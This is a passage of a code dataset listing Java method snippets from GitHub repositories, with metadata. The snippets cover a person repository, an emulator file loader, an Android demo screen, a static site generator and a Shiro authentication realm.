"https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Update", "params": ["int", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Update(int id, String firstName, String lastName) {        int index = FindIndexById(id);        Infrastructure.Person person = FindById(id);        person.firstName = firstName;        person.lastName = lastName;        people.set(index, person);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "FindById", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Infrastructure", "snippet": "    public Infrastructure.Person FindById(int id) {        return people.get(FindIndexById(id));    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Remove", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Remove(int id) {        people.remove(FindIndexById(id));    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "FindIndexById", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int FindIndexById(int id) {        for (int i = people.size() - 1; i >= 0; i--) {            if (people.get(i).id == id)                return i;        }        return -1;    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "get", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object get(Object key){        return request.getHeader(key.toString());    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/context/HeaderContext.java", "stars": "13", "class": {"name": "HeaderContext", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "openDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void openDialog() {        int selected = chooser.showOpenDialog(owner);        Application.setCurrentDirectory(chooser.getCurrentDirectory().getAbsolutePath());        DataFile df;        File[] files = chooser.getSelectedFiles();        File f = null;        Program merged_program = new Program(computer.getHardware().getMemory());        StringBuilder sb = new StringBuilder();        if (selected == JFileChooser.APPROVE_OPTION) {            for (int i = 0; i < files.length; i++) {                f = files[i];                if (DataFile.isProgFile(f)) {                    df = new ProgFormatFile(f);                }                else if (DataFile.isBasicTextFile(f)) {                    df = new BasicTextFormatFile(f);                }                else {                    df = new BinaryTextFormatFile(f);                }                Program p = df.load_jr100(computer.getHardware().getMemory());                if (df.getErrorStatus() != DataFile.STATUS_SUCCESS) {                    JOptionPane.showMessageDialog(                            chooser,                            df.getErrorMessage(),                            \"\u30a8\u30e9\u30fc\",                            JOptionPane.ERROR_MESSAGE);                    return ;                }                if (merged_program.getName().equals(\"\") && !p.getName().equals(\"\")) {                    merged_program.setName(p.getName());                }                if (!p.getComment().equals(\"\")) {                    sb.delete(0, sb.length());                    sb.append(merged_program.getComment());                    if (!merged_program.getComment().equals(\"\")) {                        sb.append(\"\\n\");                    }                    sb.append(p.getComment());                    merged_program.setComment(sb.toString());                }                if (merged_program.hasBasicArea() && p.hasBasicArea()) {                    JOptionPane.showMessageDialog(                            chooser,                            \"BASIC\u30d7\u30ed\u30b0\u30e9\u30e0\u9818\u57df\u304c\u91cd\u8907\u3057\u3066\u3044\u307e\u3059\u3002\",                            \"\u30a8\u30e9\u30fc\",                            JOptionPane.ERROR_MESSAGE);                    return ;                }                else if (!merged_program.hasBasicArea() && p.hasBasicArea()) {                    merged_program.setBasicArea(true);                }                for (AddressRegion r : p.getAllAddressRegions()) {                    if (merged_program.getAllAddressRegions().size() == ProgFormatFile.PROG_MAX_BINARY_SECTIONS) {                        break;                    }                    merged_program.addAddressRegion(r.clone());                }            }            if (files.length == 1) {                merged_program.setFile(files[0]);            }            computer.setProgram(merged_program);        }        else if (selected == JFileChooser.CANCEL_OPTION) {        }        else {            Application.getLogger().log(Level.SEVERE, \"FileChooser\u3067\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f\u3002\");        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/FileOpenHooker.java", "stars": "4", "class": {"name": "FileOpenHooker", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {        return R.layout.activity_status;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "initView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {        mAdapter = new StatusAdapter(this);        mAdapter.setOnItemClickListener(this);        mRecyclerView.setAdapter(mAdapter);        TextView headerView = mRecyclerView.addHeaderView(R.layout.item_picker);        headerView.setText(\"\u6211\u662f\u5934\u90e8\");        headerView.setOnClickListener(v -> toast(\"\u70b9\u51fb\u4e86\u5934\u90e8\"));        TextView footerView = mRecyclerView.addFooterView(R.layout.item_picker);        footerView.setText(\"\u6211\u662f\u5c3e\u90e8\");        footerView.setOnClickListener(v -> toast(\"\u70b9\u51fb\u4e86\u5c3e\u90e8\"));        mRefreshLayout.setOnRefreshLoadMoreListener(this);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "initData", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {        mAdapter.setData(analogData());        new MenuDialog.Builder(this)                //.setAutoDismiss(false) // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                .setList(\"\u52a0\u8f7d\u4e2d\", \"\u8bf7\u6c42\u9519\u8bef\", \"\u7a7a\u6570\u636e\u63d0\u793a\", \"\u81ea\u5b9a\u4e49\u63d0\u793a\")                .setListener((dialog, position, object) -> {                    switch (position) {                        case 0:                            showLoading();                            postDelayed(this::showComplete, 2000);                            break;                        case 1:                            showError(v -> {                                showLoading();                                postDelayed(this::showEmpty, 2000);                            });                            break;                        case 2:                            showEmpty();                            break;                        case 3:                            showLayout(ContextCompat.getDrawable(getActivity(), R.drawable.ic_hint_order), \"\u6682\u65e0\u8ba2\u5355\", null);                            break;                        default:                            break;                    }                })                .show();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "getHintLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HintLayout", "snippet": "    public HintLayout getHintLayout() {        return mHintLayout;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "analogData", "params": [], "throws": null, "modifiers": ["private"], "return_type": "List<String>", "snippet": "    private List<String> analogData() {        List<String> data = new ArrayList<>();        for (int i = mAdapter.getItemCount(); i < mAdapter.getItemCount() + 20; i++) {            data.add(\"\u6211\u662f\u7b2c\" + i + \"\u6761\u76ee\");        }        return data;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "onItemClick", "params": ["RecyclerView", "View", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onItemClick(RecyclerView recyclerView, View itemView, int position) {        toast(mAdapter.getItem(position));    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "onRefresh", "params": ["RefreshLayout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRefresh(@NonNull RefreshLayout refreshLayout) {        postDelayed(() -> {            mAdapter.clearData();            mAdapter.setData(analogData());            mRefreshLayout.finishRefresh();            toast(\"\u5237\u65b0\u5b8c\u6210\");        }, 1000);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "onLoadMore", "params": ["RefreshLayout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLoadMore(@NonNull RefreshLayout refreshLayout) {        postDelayed(() -> {            mAdapter.addData(analogData());            mRefreshLayout.finishLoadMore();            toast(\"\u52a0\u8f7d\u5b8c\u6210\");        }, 1000);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/StatusActivity.java", "stars": "1", "class": {"name": "StatusActivity", "extends": "MyActivity", "implements": ["StatusAction", "OnRefreshLoadMoreListener", "BaseAdapter"], "modifiers": ["public", "final"]}}, {"method_name": "applyTransactionTimeout", "params": ["Statement", "Integer", "Integer"], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void applyTransactionTimeout(Statement statement, Integer queryTimeout, Integer transactionTimeout) throws SQLException {    if (transactionTimeout == null) {      return;    }    if (queryTimeout == null || queryTimeout == 0 || transactionTimeout < queryTimeout) {      statement.setQueryTimeout(transactionTimeout);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/StatementUtil.java", "stars": "15", "class": {"name": "StatementUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printBanner", "params": ["Environment", "Class<?>", "PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void printBanner(Environment environment, Class<?> sourceClass, PrintStream printStream) {\t\tfor (String line : BANNER) {\t\t\tprintStream.println(line);\t\t}\t\tString version = SpringBootVersion.getVersion();\t\tversion = (version != null) ? \" (v\" + version + \")\" : \"\";\t\tStringBuilder padding = new StringBuilder();\t\twhile (padding.length() < STRAP_LINE_SIZE - (version.length() + SPRING_BOOT.length())) {\t\t\tpadding.append(\" \");\t\t}\t\tprintStream.println(AnsiOutput.toString(AnsiColor.GREEN, SPRING_BOOT, AnsiColor.DEFAULT, padding.toString(),\t\t\t\tAnsiStyle.FAINT, version));\t\tprintStream.println();\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringBootBanner.java", "stars": "47572", "class": {"name": "SpringBootBanner", "extends": null, "implements": ["Banner"], "modifiers": []}}, {"method_name": "checkType", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\t\tthis.getLeft().checkType();\t\tthis.getRight().checkType();\t\tTypeCode[] typeCodes = {TypeCode.INTEGER, TypeCode.FLOAT};\t\tgetLeft().getType().assertType(this, typeCodes);\t\tgetLeft().getType().assertType(this, getRight().getType());\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGE.java", "stars": "3", "class": {"name": "ExprGE", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "generateCode", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\t\tString result;\t\tresult = \"(\" + getLeft().generateCode()\t\t\t\t+ \" >= \" + getRight().generateCode() + \")\";\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGE.java", "stars": "3", "class": {"name": "ExprGE", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "constEval", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\t\tObject o1 = getLeft().constEval(environment);\t\tObject o2 = getRight().constEval(environment);\t\tif ((o1 instanceof Integer) && (o2 instanceof Integer)) \t\t\treturn new Boolean((Integer)o1 >= (Integer)o2);\t\telse if ((o1 instanceof Float) && (o2 instanceof Float)) \t\t\treturn new Boolean((Float)o1 >= (Float)o2);\t\telse\t\t\tthrow new TypeException(\"Impossible de calculer la constante, erreur de type\", line, column);\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGE.java", "stars": "3", "class": {"name": "ExprGE", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\treturn \"(\" + this.getLeft() + \" >= \" + this.getRight() + \")\";\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprGE.java", "stars": "3", "class": {"name": "ExprGE", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "getEntityManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "EntityManager", "snippet": "\tpublic static EntityManager getEntityManager() {\t\treturn factory.createEntityManager();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/util/JPAUtil.java", "stars": "1", "class": {"name": "JPAUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "valueChanged", "params": ["ListSelectionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void valueChanged(ListSelectionEvent e) {        String path= ProjectViewer.liquidString+\"\\\\\"+ GUI.pvv2.elementAt(GUI.pvl2.getSelectedIndex()).toString();        File file=new File(path);        StringBuilder result = new StringBuilder();        BufferedReader bf= null;        System.out.println(path);        try {            bf = new BufferedReader(new FileReader(file));            String s;            BufferedReader bf1=new BufferedReader(new FileReader(file));            String s1;            while((s1 = bf1.readLine())!=null){                result.append(System.lineSeparator()+s1);            }            bf.close();            GUI.jt1.setText(result.toString());        } catch (IOException ex) {            ex.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/4156/MindustryModMaker/master/src/Listener/LiquidProjectListener.java", "stars": "2", "class": {"name": "LiquidProjectListener", "extends": null, "implements": ["ListSelectionListener"], "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void start() {        new StaticLoader().statics().pages().tags().categories().archive().list()._404();    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "Loader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "statics", "params": [], "throws": null, "modifiers": ["private"], "return_type": "PageLoader", "snippet": "        private PageLoader statics() {            var root = PathUtil.convertCorrectPath(Bored.env().getThemePath());            var path = PathUtil.convertCorrectPath(Bored.env().getStaticPath());            var files = FileUtil.loopFiles(path);            for (File file : files) {                var uri = PathUtil.convertCorrectUrl(StrUtil.removePrefix(file.getPath(), root));                var fullFilePath = Bored.env().getOutputPath() + uri;                var url = URL.builder().filePath(file.getPath()).uri(uri).contentType(contentType(file.getName(), file.getPath()))                        .context(null).fullFilePath(fullFilePath).build();                Container.put(uri, url);                log.info(\"Mapping static resource {}\", uri);            }            return new PageLoader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "StaticLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "contentType", "params": ["String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "        private static String contentType(String fileName, String filePath) {            if (StrUtil.endWith(fileName, \".css\")) {                return \"text/css; charset=utf-8\";            }            if (StrUtil.endWith(fileName, \".js\")) {                return \"application/javascript; charset=utf-8\";            }            String contentType = FileUtil.getMimeType(filePath);            if (StrUtil.isEmpty(contentType)) {                return \"application/octet-stream\";            }            return contentType;        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "StaticLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "pages", "params": [], "throws": null, "modifiers": ["private"], "return_type": "TagLoader", "snippet": "        private TagLoader pages() {            var env = Bored.env();            var files = FileUtil.loopFiles(env.getPagePath());            List<Page> pages = new ArrayList<>();            for (File file : files) {                var pageFile = new PageFile(file);                var page = pageFile.toPage();                var url = pageFile.pageToURL(page);                Container.put(url.uri, url);                /*\u4e0d\u52a0\u8f7d\u6839\u76ee\u5f55\u4e0b\u7684md\u6587\u4ef6\u5230list\u5217\u8868\u4e2d*/                if (StrUtil.count(url.uri, \"/\") > 1) {                    pages.add(page);                }                log.info(\"Mapping page {}\", url.uri);            }            env.setPages(pages.stream().sorted(Comparator.comparing(Page::getDate).reversed()).collect(Collectors.toList()));            for (int i = 0, len = env.getPages().size(); i < len; i++) {                if (i < (len - 1)) env.getPages().get(i).setNext(env.getPages().get(i + 1));                if (i > 0) env.getPages().get(i).setPrev(env.getPages().get(i - 1));            }            return new TagLoader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "PageLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "tags", "params": [], "throws": null, "modifiers": ["private"], "return_type": "CategoryLoader", "snippet": "        private CategoryLoader tags() {            List<Tag> tagList = new ArrayList<>();            Bored.env().getPages().parallelStream().forEach(page -> Optional.of(page.getTags()).ifPresent(strings -> strings.parallelStream().forEach(tagName -> {                var uri = \"/tag/\" + tagName + Bored.env().getSiteConfig().getURLSuffix();                var tag = new Tag(tagName, uri);                tag.getPages().add(page);                tagList.add(tag);            })));            List<Tag> tags = new ArrayList<>();            tagList.stream().collect(Collectors.groupingBy(Tag::getUrl)).forEach((url, list) -> list.stream().reduce((t1, t2) -> {                t1.getPages().addAll(t2.getPages());                return t1;            }).ifPresent(tags::add));            tags.parallelStream().forEach(tag -> {                var url = tag.toURL();                Container.put(url.uri, url);                log.info(\"Mapping tag {} {}\", tag.getName(), url.uri);            });            var uri = \"/tags\" + Bored.env().getSiteConfig().getURLSuffix();            var context = Context.builder().title(\"\u6807\u7b7e\u5217\u8868\").type(\"base\").layout(\"tags\").url(uri).build();            var url = URL.builder().uri(uri)                    .fullFilePath(Bored.env().getOutputPath() + \"/tags.html\")                    .context(context)                    .contentType(TEXT_HTML).build().add(\"tags\", tags);            Bored.env().setTags(tags);            Container.put(uri, url);            log.info(\"Mapping tags {}\", uri);            return new CategoryLoader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "TagLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "categories", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ArchiveLoader", "snippet": "        private ArchiveLoader categories() {            List<Category> categoryList = new ArrayList<>();            Bored.env().getPages().parallelStream().forEach(page -> Optional.of(page.getCategories()).ifPresent(strings -> strings.parallelStream().forEach(categoryName -> {                var uri = \"/tag/\" + categoryName + Bored.env().getSiteConfig().getURLSuffix();                var tag = new Category(categoryName, uri);                tag.getPages().add(page);                categoryList.add(tag);            })));            List<Category> categories = new ArrayList<>();            categoryList.stream().collect(Collectors.groupingBy(Category::getUrl)).forEach((url, list) -> list.stream().reduce((t1, t2) -> {                t1.getPages().addAll(t2.getPages());                return t1;            }).ifPresent(categories::add));            categories.parallelStream().forEach(tag -> {                var url = tag.toURL();                Container.put(url.uri, url);                log.info(\"Mapping category {} {}\", tag.getName(), url.uri);            });            var uri = \"/categories\" + Bored.env().getSiteConfig().getURLSuffix();            var context = Context.builder().title(\"\u5206\u7c7b\u5217\u8868\").type(\"base\").layout(\"categories\").url(uri).build();            var url = URL.builder().uri(uri)                    .fullFilePath(Bored.env().getOutputPath() + \"/categories.html\")                    .context(context)                    .contentType(TEXT_HTML).build().add(\"categories\", categories);            Bored.env().setCategories(categories);            Container.put(uri, url);            log.info(\"Mapping categories {}\", uri);            return new ArchiveLoader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "CategoryLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "archive", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ListLoader", "snippet": "        private ListLoader archive() {            var uri = \"/archive/posts\" + Bored.env().getSiteConfig().getURLSuffix();            var context = Context.builder().title(\"\u5f52\u6863:Posts\").type(\"post\").layout(\"archive\").url(uri).build();            var url = URL.builder().uri(uri).context(context).contentType(TEXT_HTML).fullFilePath(Bored.env().getOutputPath() + \"/archive/posts.html\").build()                    .add(\"pages\", Bored.env().getPages());            Container.put(uri, url);            log.info(\"Mapping archive {}\", uri);            return new ListLoader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "ArchiveLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "list", "params": [], "throws": null, "modifiers": ["private"], "return_type": "_404Loader", "snippet": "        private _404Loader list() {            var paginationMap = PaginationUtil.loadPagination(\"post/list.html\");            paginationMap.forEach(pagination -> {                var ctx = Context.builder().title(\"\u6587\u7ae0\u5217\u8868\").type(\"post\").layout(\"list\").url(pagination.getUri()).build();                var page = URL.builder().uri(pagination.getUri()).context(ctx).contentType(TEXT_HTML)                        .fullFilePath(Bored.env().getOutputPath() + \"/page/\" + pagination.getCurrent() + \".html\").build()                        .add(\"pages\", Bored.env().getPages())                        .add(\"pagination\", pagination);                Container.put(pagination.getUri(), page);                log.info(\"Mapping archive {}\", pagination.getUri());            });            loadIndex(paginationMap.get(0));            return new _404Loader();        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "ListLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "loadIndex", "params": ["Pagination"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "        private static void loadIndex(Pagination pagination) {            var uri = \"/index\" + Bored.env().getSiteConfig().getURLSuffix();            var context = Context.builder().title(\"\u9996\u9875\").layout(\"index\").url(uri).build();            var url = URL.builder().uri(uri).context(context).fullFilePath(Bored.env().getOutputPath() + \"/index.html\").contentType(TEXT_HTML).build()                    .add(\"pages\", Bored.env().getPages())                    .add(\"pagination\", pagination);            Container.put(uri, url);            log.info(\"Mapping archive {}\", uri);        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "ListLoader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "_404", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void _404() {            var uri = \"/404\" + Bored.env().getSiteConfig().getURLSuffix();            var context = Context.builder().title(\"404\").layout(\"404\").url(uri).build();            var url = URL.builder().uri(uri).context(context).fullFilePath(Bored.env().getOutputPath() + \"/404.html\").contentType(TEXT_HTML).build();            Container.put(uri, url);            log.info(\"Mapping 404 {}\", uri);        }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Loader.java", "stars": "2", "class": {"name": "_404Loader", "extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "format", "params": ["Date", "StringBuffer", "FieldPosition"], "throws": null, "modifiers": ["public"], "return_type": "StringBuffer", "snippet": "  public StringBuffer format(Date date, StringBuffer toAppendTo, FieldPosition fieldPosition) {    String value = ISO8601Utils.format(date, true);    toAppendTo.append(value);    return toAppendTo;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/io/swagger/RFC3339DateFormat.java", "stars": "2", "class": {"name": "RFC3339DateFormat", "extends": "ISO8601DateFormat", "implements": null, "modifiers": ["public"]}}, {"method_name": "doGetAuthorizationInfo", "params": ["PrincipalCollection"], "throws": null, "modifiers": ["protected"], "return_type": "AuthorizationInfo", "snippet": "    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {        SimpleAuthorizationInfo s = new SimpleAuthorizationInfo();        return s;    }", "url": "https://raw.githubusercontent.com/lixiangwudi/service/master/src/main/java/com/example/lx/shiro/WJRealm.java", "stars": "2", "class": {"name": "WJRealm", "extends": "AuthorizingRealm", "implements": null, "modifiers": ["public"]}}, {"method_name": "doGetAuthenticationInfo", "params": ["AuthenticationToken"], "throws": ["AuthenticationException"], "modifiers": ["protected"], "return_type": "AuthenticationInfo", "snippet": "    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {        String userName = token.getPrincipal().toString();        User user = userService.getByName(userName);        String passwordInDB = user.getPassword();        String salt = user.getSalt();        SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(userName, passwordInDB, ByteSource.Util.bytes(salt), getName());        return authenticationInfo;    }", "url": "https://raw.githubusercontent.com/lixiangwudi/service/master/src/main/java/com/example/lx/shiro/WJRealm.java", "stars": "2", "class": {"name": "WJRealm", "extends": "AuthorizingRealm", "implements": null, "modifiers": ["public"]}}, {"method_name": "getPartKeys", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getPartKeys() {        return partKeys;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setPartKeys", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPartKeys(List<String> partKeys) {        this.partKeys = partKeys;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getRoot", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PartitionNode", "snippet": "    public PartitionNode getRoot() {        return root;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setRoot", "params": ["PartitionNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRoot(PartitionNode root) {        this.root = root;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "MetaPartitionInfo", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, 